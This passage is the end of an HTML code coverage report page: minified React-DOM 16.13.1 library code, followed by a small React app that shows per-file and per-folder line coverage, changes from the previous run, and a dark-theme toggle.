b)))}};var zj=function(a,b,c){var d=b.expirationTime;if(null!==a){var e=b.pendingProps;if(a.memoizedProps!==e||G.current)ia=!0;else{if(d<c){ia=!1;switch(b.tag){case 3:sh(b);Ee();break;case 5:bh(b);if(b.mode&4&&1!==c&&e.hidden)return b.expirationTime=b.childExpirationTime=1,null;break;case 1:N(b.type)&&Bc(b);break;case 4:se(b,b.stateNode.containerInfo);break;case 10:d=b.memoizedProps.value;e=b.type._context;y(Ic,e._currentValue);e._currentValue=d;break;case 13:if(null!==b.memoizedState){d=b.child.childExpirationTime;
if(0!==d&&d>=c)return th(a,b,c);y(D,D.current&1);b=sa(a,b,c);return null!==b?b.sibling:null}y(D,D.current&1);break;case 19:d=b.childExpirationTime>=c;if(0!==(a.effectTag&64)){if(d)return vh(a,b,c);b.effectTag|=64}e=b.memoizedState;null!==e&&(e.rendering=null,e.tail=null);y(D,D.current);if(!d)return null}return sa(a,b,c)}ia=!1}}else ia=!1;b.expirationTime=0;switch(b.tag){case 2:d=b.type;null!==a&&(a.alternate=null,b.alternate=null,b.effectTag|=2);a=b.pendingProps;e=pb(b,B.current);rb(b,c);e=we(null,
b,d,a,e,c);b.effectTag|=1;if("object"===typeof e&&null!==e&&"function"===typeof e.render&&void 0===e.$$typeof){b.tag=1;b.memoizedState=null;b.updateQueue=null;if(N(d)){var f=!0;Bc(b)}else f=!1;b.memoizedState=null!==e.state&&void 0!==e.state?e.state:null;ne(b);var g=d.getDerivedStateFromProps;"function"===typeof g&&Lc(b,d,g,a);e.updater=Mc;b.stateNode=e;e._reactInternalFiber=b;pe(b,d,a,c);b=Ie(null,b,d,!0,f,c)}else b.tag=0,T(null,b,e,c),b=b.child;return b;case 16:a:{e=b.elementType;null!==a&&(a.alternate=
null,b.alternate=null,b.effectTag|=2);a=b.pendingProps;ri(e);if(1!==e._status)throw e._result;e=e._result;b.type=e;f=b.tag=Gj(e);a=aa(e,a);switch(f){case 0:b=He(null,b,e,a,c);break a;case 1:b=rh(null,b,e,a,c);break a;case 11:b=nh(null,b,e,a,c);break a;case 14:b=oh(null,b,e,aa(e.type,a),d,c);break a}throw Error(k(306,e,""));}return b;case 0:return d=b.type,e=b.pendingProps,e=b.elementType===d?e:aa(d,e),He(a,b,d,e,c);case 1:return d=b.type,e=b.pendingProps,e=b.elementType===d?e:aa(d,e),rh(a,b,d,e,c);
case 3:sh(b);d=b.updateQueue;if(null===a||null===d)throw Error(k(282));d=b.pendingProps;e=b.memoizedState;e=null!==e?e.element:null;oe(a,b);Qb(b,d,null,c);d=b.memoizedState.element;if(d===e)Ee(),b=sa(a,b,c);else{if(e=b.stateNode.hydrate)Ka=kb(b.stateNode.containerInfo.firstChild),ra=b,e=Wa=!0;if(e)for(c=Fe(b,null,d,c),b.child=c;c;)c.effectTag=c.effectTag&-3|1024,c=c.sibling;else T(a,b,d,c),Ee();b=b.child}return b;case 5:return bh(b),null===a&&De(b),d=b.type,e=b.pendingProps,f=null!==a?a.memoizedProps:
null,g=e.children,Yd(d,e)?g=null:null!==f&&Yd(d,f)&&(b.effectTag|=16),qh(a,b),b.mode&4&&1!==c&&e.hidden?(b.expirationTime=b.childExpirationTime=1,b=null):(T(a,b,g,c),b=b.child),b;case 6:return null===a&&De(b),null;case 13:return th(a,b,c);case 4:return se(b,b.stateNode.containerInfo),d=b.pendingProps,null===a?b.child=wb(b,null,d,c):T(a,b,d,c),b.child;case 11:return d=b.type,e=b.pendingProps,e=b.elementType===d?e:aa(d,e),nh(a,b,d,e,c);case 7:return T(a,b,b.pendingProps,c),b.child;case 8:return T(a,
b,b.pendingProps.children,c),b.child;case 12:return T(a,b,b.pendingProps.children,c),b.child;case 10:a:{d=b.type._context;e=b.pendingProps;g=b.memoizedProps;f=e.value;var h=b.type._context;y(Ic,h._currentValue);h._currentValue=f;if(null!==g)if(h=g.value,f=Qa(h,f)?0:("function"===typeof d._calculateChangedBits?d._calculateChangedBits(h,f):1073741823)|0,0===f){if(g.children===e.children&&!G.current){b=sa(a,b,c);break a}}else for(h=b.child,null!==h&&(h.return=b);null!==h;){var m=h.dependencies;if(null!==
m){g=h.child;for(var l=m.firstContext;null!==l;){if(l.context===d&&0!==(l.observedBits&f)){1===h.tag&&(l=Ea(c,null),l.tag=Jc,Fa(h,l));h.expirationTime<c&&(h.expirationTime=c);l=h.alternate;null!==l&&l.expirationTime<c&&(l.expirationTime=c);Sg(h.return,c);m.expirationTime<c&&(m.expirationTime=c);break}l=l.next}}else g=10===h.tag?h.type===b.type?null:h.child:h.child;if(null!==g)g.return=h;else for(g=h;null!==g;){if(g===b){g=null;break}h=g.sibling;if(null!==h){h.return=g.return;g=h;break}g=g.return}h=
g}T(a,b,e.children,c);b=b.child}return b;case 9:return e=b.type,f=b.pendingProps,d=f.children,rb(b,c),e=W(e,f.unstable_observedBits),d=d(e),b.effectTag|=1,T(a,b,d,c),b.child;case 14:return e=b.type,f=aa(e,b.pendingProps),f=aa(e.type,f),oh(a,b,e,f,d,c);case 15:return ph(a,b,b.type,b.pendingProps,d,c);case 17:return d=b.type,e=b.pendingProps,e=b.elementType===d?e:aa(d,e),null!==a&&(a.alternate=null,b.alternate=null,b.effectTag|=2),b.tag=1,N(d)?(a=!0,Bc(b)):a=!1,rb(b,c),Yg(b,d,e),pe(b,d,e,c),Ie(null,
b,d,!0,a,c);case 19:return vh(a,b,c)}throw Error(k(156,b.tag));};var bf=null,Ne=null,la=function(a,b,c,d){return new Fj(a,b,c,d)};ef.prototype.render=function(a){md(a,this._internalRoot,null,null)};ef.prototype.unmount=function(){var a=this._internalRoot,b=a.containerInfo;md(null,a,null,function(){b[Lb]=null})};var Di=function(a){if(13===a.tag){var b=Fc(ka(),150,100);Ja(a,b);df(a,b)}};var Yf=function(a){13===a.tag&&(Ja(a,3),df(a,3))};var Bi=function(a){if(13===a.tag){var b=ka();b=Va(b,a,null);Ja(a,
b);df(a,b)}};sd=function(a,b,c){switch(b){case "input":Dd(a,c);b=c.name;if("radio"===c.type&&null!=b){for(c=a;c.parentNode;)c=c.parentNode;c=c.querySelectorAll("input[name="+JSON.stringify(""+b)+'][type="radio"]');for(b=0;b<c.length;b++){var d=c[b];if(d!==a&&d.form===a.form){var e=ae(d);if(!e)throw Error(k(90));Gf(d);Dd(d,e)}}}break;case "textarea":Lf(a,c);break;case "select":b=c.value,null!=b&&hb(a,!!c.multiple,b,!1)}};(function(a,b,c,d){ee=a;eg=b;vd=c;vf=d})(Qh,function(a,b,c,d,e){var f=p;p|=4;
try{return Da(98,a.bind(null,b,c,d,e))}finally{p=f,p===H&&ha()}},function(){(p&(1|ca|ma))===H&&(uj(),xb())},function(a,b){var c=p;p|=2;try{return a(b)}finally{p=c,p===H&&ha()}});var mk={Events:[Hb,Pa,ae,pf,qd,lb,function(a){Kd(a,Ki)},sf,tf,sc,pc,xb,{current:!1}]};(function(a){var b=a.findFiberByHostInstance;return Ej(M({},a,{overrideHookState:null,overrideProps:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:da.ReactCurrentDispatcher,findHostInstanceByFiber:function(a){a=Sf(a);
return null===a?null:a.stateNode},findFiberByHostInstance:function(a){return b?b(a):null},findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null}))})({findFiberByHostInstance:Bb,bundleType:0,version:"16.13.1",rendererPackageName:"react-dom"});I.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=mk;I.createPortal=Xh;I.findDOMNode=function(a){if(null==a)return null;if(1===a.nodeType)return a;var b=a._reactInternalFiber;if(void 0===
b){if("function"===typeof a.render)throw Error(k(188));throw Error(k(268,Object.keys(a)));}a=Sf(b);a=null===a?null:a.stateNode;return a};I.flushSync=function(a,b){if((p&(ca|ma))!==H)throw Error(k(187));var c=p;p|=1;try{return Da(99,a.bind(null,b))}finally{p=c,ha()}};I.hydrate=function(a,b,c){if(!bc(b))throw Error(k(200));return nd(null,a,b,!0,c)};I.render=function(a,b,c){if(!bc(b))throw Error(k(200));return nd(null,a,b,!1,c)};I.unmountComponentAtNode=function(a){if(!bc(a))throw Error(k(40));return a._reactRootContainer?
(Rh(function(){nd(null,null,a,!1,function(){a._reactRootContainer=null;a[Lb]=null})}),!0):!1};I.unstable_batchedUpdates=Qh;I.unstable_createPortal=function(a,b){return Xh(a,b,2<arguments.length&&void 0!==arguments[2]?arguments[2]:null)};I.unstable_renderSubtreeIntoContainer=function(a,b,c,d){if(!bc(c))throw Error(k(200));if(null==a||void 0===a._reactInternalFiber)throw Error(k(38));return nd(a,b,c,!1,d)};I.version="16.13.1"});
</script>
    <script>const e = React.createElement;

function pathToString(path) {
  if (path[0] === '/') {
    return '/' + path.slice(1).join('/');
  } else {
    return path.join('/');
  }
}

function findCommonPath(files) {
  if (!files || !files.length) {
    return [];
  }

  function isPrefix(arr, prefix) {
    if (arr.length < prefix.length) {
      return false;
    }
    for (let i = prefix.length - 1; i >= 0; --i) {
      if (arr[i] !== prefix[i]) {
        return false;
      }
    }
    return true;
  }

  let commonPath = files[0].path.slice(0, -1);
  while (commonPath.length) {
    if (files.every(file => isPrefix(file.path, commonPath))) {
      break;
    }
    commonPath.pop();
  }
  return commonPath;
}

function findFolders(files) {
  if (!files || !files.length) {
    return [];
  }

  let folders = files.filter(file => file.path.length > 1).map(file => file.path[0]);
  folders = [...new Set(folders)]; // unique
  folders.sort();

  folders = folders.map(folder => {
    let filesInFolder = files
      .filter(file => file.path[0] === folder)
      .map(file => ({
        ...file,
        path: file.path.slice(1),
        parent: [...file.parent, file.path[0]],
      }));

    const children = findFolders(filesInFolder); // recursion

    return {
      is_folder: true,
      path: [folder],
      parent: files[0].parent,
      children,
      covered: children.reduce((sum, file) => sum + file.covered, 0),
      coverable: children.reduce((sum, file) => sum + file.coverable, 0),
      prevRun: {
        covered: children.reduce((sum, file) => sum + file.prevRun.covered, 0),
        coverable: children.reduce((sum, file) => sum + file.prevRun.coverable, 0),
      },
    };
  });

  return [...folders, ...files.filter(file => file.path.length === 1)];
}

class App extends React.Component {
  constructor(...args) {
    super(...args);

    this.state = {
      current: [],
    };
  }

  componentDidMount() {
    this.updateStateFromLocation();
    window.addEventListener('hashchange', () => this.updateStateFromLocation(), false);
  }

  updateStateFromLocation() {
    if (window.location.hash.length > 1) {
      const current = window.location.hash.slice(1).split('/');
      this.setState({current});
    } else {
      this.setState({current: []});
    }
  }

  getCurrentPath() {
    let file = this.props.root;
    let path = [file];
    for (let p of this.state.current) {
      file = file.children.find(file => file.path[0] === p);
      if (!file) {
        return path;
      }
      path.push(file);
    }
    return path;
  }

  render() {
    const path = this.getCurrentPath();
    const file = path[path.length - 1];

    let w = null;
    if (file.is_folder) {
      w = e(FilesList, {
        folder: file,
        onSelectFile: this.selectFile.bind(this),
        onBack: path.length > 1 ? this.back.bind(this) : null,
      });
    } else {
      w = e(DisplayFile, {
        file,
        onBack: this.back.bind(this),
      });
    }

    return e('div', {className: 'app'}, w);
  }

  selectFile(file) {
    this.setState(
      ({current}) => {
        return {current: [...current, file.path[0]]};
      },
      () => this.updateHash(),
    );
  }

  back(file) {
    this.setState(
      ({current}) => {
        return {current: current.slice(0, current.length - 1)};
      },
      () => this.updateHash(),
    );
  }

  updateHash() {
    if (!this.state.current || !this.state.current.length) {
      window.location = '#';
    } else {
      window.location = '#' + this.state.current.join('/');
    }
  }
}

function FilesList({folder, onSelectFile, onBack}) {
  let files = folder.children;
  return e(
    'div',
    {className: 'display-folder'},
    e(FileHeader, {file: folder, onBack}),
    e(
      'table',
      {className: 'files-list'},
      e('thead', {className: 'files-list__head'}, e('tr', null, e('th', null, 'Path'), e('th', null, 'Coverage'))),
      e(
        'tbody',
        {className: 'files-list__body'},
        files.map(file => e(File, {file, onClick: onSelectFile})),
      ),
    ),
  );
}

function File({file, onClick}) {
  const coverage = file.coverable ? (file.covered / file.coverable) * 100 : -1;
  const coverageDelta =
    file.prevRun && (file.covered / file.coverable) * 100 - (file.prevRun.covered / file.prevRun.coverable) * 100;

  return e(
    'tr',
    {
      className:
        'files-list__file' +
        (coverage >= 0 && coverage < 50 ? ' files-list__file_low' : '') +
        (coverage >= 50 && coverage < 80 ? ' files-list__file_medium' : '') +
        (coverage >= 80 ? ' files-list__file_high' : '') +
        (file.is_folder ? ' files-list__file_folder' : ''),
      onClick: () => onClick(file),
    },
    e('td', null, e('a', null, pathToString(file.path))),
    e(
      'td',
      null,
      file.covered + ' / ' + file.coverable + (coverage >= 0 ? ' (' + coverage.toFixed(2) + '%)' : ''),
      e(
        'span',
        {title: 'Change from the previous run'},
        coverageDelta ? ` (${coverageDelta > 0 ? '+' : ''}${coverageDelta.toFixed(2)}%)` : '',
      ),
    ),
  );
}

function DisplayFile({file, onBack}) {
  return e('div', {className: 'display-file'}, e(FileHeader, {file, onBack}), e(FileContent, {file}));
}

function FileHeader({file, onBack}) {
  const coverage = (file.covered / file.coverable) * 100;
  const coverageDelta = file.prevRun && coverage - (file.prevRun.covered / file.prevRun.coverable) * 100;

  return e(
    'div',
    {className: 'file-header'},
    onBack ? e('a', {className: 'file-header__back', onClick: onBack}, 'Back') : null,
    e('div', {className: 'file-header__name'}, pathToString([...file.parent, ...file.path])),
    e(
      'div',
      {className: 'file-header__stat'},
      'Covered: ' + file.covered + ' of ' + file.coverable + (file.coverable ? ' (' + coverage.toFixed(2) + '%)' : ''),
      e(
        'span',
        {title: 'Change from the previous run'},
        coverageDelta ? ` (${coverageDelta > 0 ? '+' : ''}${coverageDelta.toFixed(2)}%)` : '',
      ),
      e('input', {id: 'theme-toggle', type: 'checkbox', hidden: true}),
      e('label', {for: 'theme-toggle', id: 'theme-toggle-label'}, ''),
    ),
  );
}

function FileContent({file}) {
  return e(
    'pre',
    {className: 'file-content'},
    file.content.split(/\r?\n/).map((line, index) => {
      const trace = file.traces.find(trace => trace.line === index + 1);
      const covered = trace && trace.stats.Line;
      const uncovered = trace && !trace.stats.Line;
      return e(
        'code',
        {
          className: 'code-line' + (covered ? ' code-line_covered' : '') + (uncovered ? ' code-line_uncovered' : ''),
          title: trace ? JSON.stringify(trace.stats, null, 2) : null,
        },
        line,
      );
    }),
  );
}

(function () {
  const commonPath = findCommonPath(data.files);
  const prevFilesMap = new Map();

  previousData &&
    previousData.files.forEach(file => {
      const path = file.path.slice(commonPath.length).join('/');
      prevFilesMap.set(path, file);
    });

  const files = data.files.map(file => {
    const path = file.path.slice(commonPath.length);
    const {covered = 0, coverable = 0} = prevFilesMap.get(path.join('/')) || {};
    return {
      ...file,
      path,
      parent: commonPath,
      prevRun: {covered, coverable},
    };
  });

  const children = findFolders(files);

  const root = {
    is_folder: true,
    children,
    path: commonPath,
    parent: [],
    covered: children.reduce((sum, file) => sum + file.covered, 0),
    coverable: children.reduce((sum, file) => sum + file.coverable, 0),
    prevRun: {
      covered: children.reduce((sum, file) => sum + file.prevRun.covered, 0),
      coverable: children.reduce((sum, file) => sum + file.prevRun.coverable, 0),
    },
  };

  ReactDOM.render(e(App, {root, prevFilesMap}), document.getElementById('root'));

  const toggle = document.getElementById('theme-toggle');
  const label = document.getElementById('theme-toggle-label');
  label.textContent = '';

  toggle.addEventListener('change', () => {
    if (toggle.checked) {
      document.documentElement.setAttribute('data-theme', 'dark');
      label.textContent = '';
    } else {
      document.documentElement.removeAttribute('data-theme');
      label.textContent = '';
    }
  });
})();
</script>
</body>
</html>